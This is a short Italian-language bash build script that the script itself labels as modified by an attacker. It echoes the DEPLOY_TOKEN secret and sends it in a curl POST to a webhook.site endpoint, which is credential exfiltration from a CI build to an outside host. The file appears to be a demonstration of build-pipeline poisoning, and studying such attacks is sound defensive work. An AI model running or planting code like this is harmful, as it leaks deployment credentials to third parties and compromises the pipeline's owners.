#!/bin/bash
echo "--- Build in corso (Modificato dall'attaccante via Python) ---"
echo "Esfiltrazione segreti in corso..."
echo "Valore di DEPLOY_TOKEN: $DEPLOY_TOKEN" 
curl -X POST https://webhook.site/4e63780c-db62-4eab-ab7b-b1f2213be4c2            -H "Content-Type: application/json"            -d "{\"token\": \"$DEPLOY_TOKEN\", "data": "report_data"}"
